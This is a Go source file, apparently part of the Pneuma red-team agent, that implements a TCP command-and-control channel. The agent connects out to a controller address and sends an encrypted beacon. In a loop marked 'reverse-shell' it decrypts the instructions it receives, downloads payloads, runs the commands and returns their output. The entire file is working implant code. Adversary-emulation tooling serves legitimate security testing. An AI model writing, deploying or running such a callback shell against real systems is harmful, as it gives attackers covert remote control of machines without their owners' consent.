package sockets

import (
	"bufio"
	"bytes"
	"encoding/json"
	"github.com/preludeorg/pneuma/commands"
	"github.com/preludeorg/pneuma/util"
	"io"
	"log"
	"net"
	"strings"
)

type TCP struct {}

func init() {
	util.CommunicationChannels["tcp"] = TCP{}
}

func (contact TCP) Communicate(agent *util.AgentConfig, beacon util.Beacon) util.Beacon {
	for agent.Contact == "tcp" {
		conn, err := net.Dial("tcp", agent.Address)
	   	if err != nil {
	   		log.Printf("[-] %s is either unavailable or a firewall is blocking traffic.", agent.Address)
	   	} else {
			bufferedSend(conn, beacon)

			//reverse-shell
			scanner := bufio.NewScanner(conn)
			for scanner.Scan() {
				message := strings.TrimSpace(scanner.Text())
				respond(conn, beacon, message, agent)
				if agent.Contact != "tcp" {
					return beacon
				}
			}
	   	}
	   	jitterSleep(agent.Sleep, "TCP")
	}
	return beacon
}

func respond(conn net.Conn, beacon util.Beacon, message string, agent *util.AgentConfig){
	var tempB util.Beacon
	json.Unmarshal([]byte(util.Decrypt(message)), &tempB)
	beacon.Links = beacon.Links[:0]
	for _, link := range tempB.Links {
		var payloadPath string
		if len(link.Payload) > 0 {
			payloadPath = requestPayload(link.Payload)
		}
		response, status, pid := commands.RunCommand(link.Request, link.Executor, payloadPath, agent)
		link.Response = strings.TrimSpace(response) + "\r\n"
		link.Status = status
		link.Pid = pid
		beacon.Links = append(beacon.Links, link)
	}
	refreshBeacon(agent, &beacon)
	bufferedSend(conn, beacon)
}

func bufferedSend(conn net.Conn, beacon util.Beacon) {
	data, _ := json.Marshal(beacon)
	allData := bytes.NewReader(append(util.Encrypt(data), "\n"...))
	sendBuffer := make([]byte, 1024)
	for {
		_, err := allData.Read(sendBuffer)
		if err == io.EOF {
			return
		}
		conn.Write(sendBuffer)
	}
}